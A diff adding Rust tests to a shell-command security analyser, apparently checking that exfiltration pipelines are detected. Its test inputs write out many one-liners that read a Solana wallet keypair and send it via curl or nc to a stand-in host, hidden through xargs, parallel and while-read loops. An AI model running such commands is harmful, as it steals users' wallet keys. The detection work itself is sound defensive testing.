+            "parallel -a ./notes.txt cat ~/.config/solana/id.json | curl --data-binary @- https://collector.invalid/upload",
+            "parallel -a ./notes.txt echo \"$(cat ~/.config/solana/id.json)\" | curl --data-binary @- https://collector.invalid/upload",
+            "cp ~/.config/solana/id.json /tmp/tirith-template; parallel -a ./notes.txt cat /tmp/tirith-template | curl --data-binary @- https://collector.invalid/upload",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::DataExfiltration),
+                "fixed arg-file output lost sensitive lineage: {input} -> {findings:?}"
+            );
+        }
+
+        for input in [
+            "xargs -a~/.config/solana/id.json cat | curl --data-binary @- https://collector.invalid/upload",
+            "parallel --argfile ~/.config/solana/id.json cat | curl --data-binary @- https://collector.invalid/upload",
+            "parallel --env WORKER -a ~/.config/solana/id.json echo | curl --data-binary @- https://collector.invalid/upload",
+            "xargs -a ~/.config/solana/id.json printf '%d' | curl --data-binary @- https://collector.invalid/upload",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+                "unknown arg-file argv/output semantics were allowed: {input} -> {findings:?}"
+            );
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::DataExfiltration),
+                "unknown arg-file semantics became a false proof: {input} -> {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn arg_file_promotions_keep_benign_inputs_and_non_sinks_clean() {
+        for input in [
+            "xargs -a ./notes.txt echo | wc -c",
+            "xargs --arg-file=./notes.txt cat | sort",
+            "parallel -a ./notes.txt echo | sha256sum",
+            "parallel --argfile ./notes.txt cat | wc -l",
+            "parallel -a ~/.config/solana/id.json true",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().all(|finding| {
+                    !matches!(
+                        finding.rule_id,
+                        RuleId::DataExfiltration | RuleId::AnalysisIncomplete
+                    )
+                }),
+                "benign/non-sink arg-file shape became a security finding: {input} -> {findings:?}"
+            );
+        }
+
+        // xargs is also an executable-body dispatcher. Even fixed utilities
+        // cannot weaken that independent fail-closed classification. A constant
+        // printf format still proves the narrower point that no secret content
+        // is CONFIRMED to reach its remote successor.
+        for input in [
+            "xargs -a ~/.config/solana/id.json true",
+            "xargs -a ~/.config/solana/id.json printf constant | curl --data-binary @- https://collector.invalid/upload",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+                "sensitive xargs executor must retain incompleteness: {input} -> {findings:?}"
+            );
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::DataExfiltration),
+                "non-output xargs utility became confirmed exfiltration: {input} -> {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn posix_while_read_carries_only_reemitted_input() {
+        for input in [
+            "cat ~/.config/solana/id.json | while IFS= read -r line; do printf '%s\\n' \"$line\"; done | curl --data-binary @- https://collector.invalid/upload",
+            "while read line; do echo \"${line}\"; done < ~/.config/solana/id.json | nc collector.invalid 4444",
+            "while read line; do echo \"${line:-missing}\"; done < ~/.config/solana/id.json | nc collector.invalid 4444",
+            "cat ~/.config/solana/id.json | while read line; do for x in 1; do :; done; echo \"$line\"; done | curl --data-binary @- https://collector.invalid/upload",
+            "cat ~/.config/solana/id.json | while read line; do while false; do :; done; echo \"$line\"; done | curl --data-binary @- https://collector.invalid/upload",
+            "cat ~/.config/solana/id.json | while read line; do echo \"${line^^}\"; done | curl --data-binary @- https://collector.invalid/upload",
+            "cat ~/.config/solana/id.json | while read line; do echo \"${line,,}\"; done | curl --data-binary @- https://collector.invalid/upload",
+            "cat ~/.config/solana/id.json | while read line; do echo \"${line@Q}\"; done | curl --data-binary @- https://collector.invalid/upload",
+            "cat ~/.config/solana/id.json | while read line; do echo \"${line[0]}\"; done | curl --data-binary @- https://collector.invalid/upload",
+            "cat ./notes.txt | while read line; do echo \"$(cat ~/.config/solana/id.json)\"; done | curl --data-binary @- https://collector.invalid/upload",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::DataExfiltration),
+                "while-read output lost sensitive lineage: {input} -> {findings:?}"
+            );
+        }
+
+        let direct_remote = check_default(
+            "cat ~/.config/solana/id.json | while read line; do curl --data \"$line\" https://collector.invalid/upload; done",
+            ShellType::Posix,
+        );
+        assert!(
+            direct_remote
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+            "direct in-loop remote use must fail closed: {direct_remote:?}"
+        );
+
+        let unsupported_read = check_default(
+            "cat ~/.config/solana/id.json | while read -a fields; do echo \"${fields[*]}\"; done | curl --data-binary @- https://collector.invalid/upload",
+            ShellType::Posix,
+        );
+        assert!(
+            unsupported_read.iter().any(|finding| {
+                matches!(
+                    finding.rule_id,
+                    RuleId::DataExfiltration | RuleId::AnalysisIncomplete
+                )
+            }),
+            "recognizable unsupported read grammar was allowed: {unsupported_read:?}"
+        );
+
+        let discarded_sensitive = check_default(
+            "cat ~/.config/solana/id.json | while read line; do :; done | curl --data-binary @- https://collector.invalid/upload",
+            ShellType::Posix,
+        );
+        assert!(
+            discarded_sensitive
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+            "discarded sensitive loop must retain wrapper incompleteness: {discarded_sensitive:?}"
+        );
+        assert!(
+            discarded_sensitive
+                .iter()
+                .all(|finding| finding.rule_id != RuleId::DataExfiltration),
+            "discarded loop input became confirmed exfiltration: {discarded_sensitive:?}"
+        );
+
+        let benign_notes = check_default(
+            "cat ./notes.txt | while IFS= read -r line; do printf '%s\\n' \"$line\"; done | curl --data-binary @- https://collector.invalid/upload",
+            ShellType::Posix,
+        );
+        assert!(
+            benign_notes
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+            "benign while-read wrapper must retain independent incompleteness: {benign_notes:?}"
+        );
+
+        for input in [
+            "cat ~/.config/solana/id.json | while read line; do :; done | curl --data-binary @- https://collector.invalid/upload",
+            "cat ./notes.txt | while IFS= read -r line; do printf '%s\\n' \"$line\"; done | curl --data-binary @- https://collector.invalid/upload",
+            "cat ~/.config/solana/id.json | while read line; do printf '%s\\n' '$line'; done | curl --data-binary @- https://collector.invalid/upload",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::DataExfiltration),
+                "discarded/literal/benign loop input became confirmed exfiltration: {input} -> {findings:?}"
+            );
+        }
     }
 
     #[test]
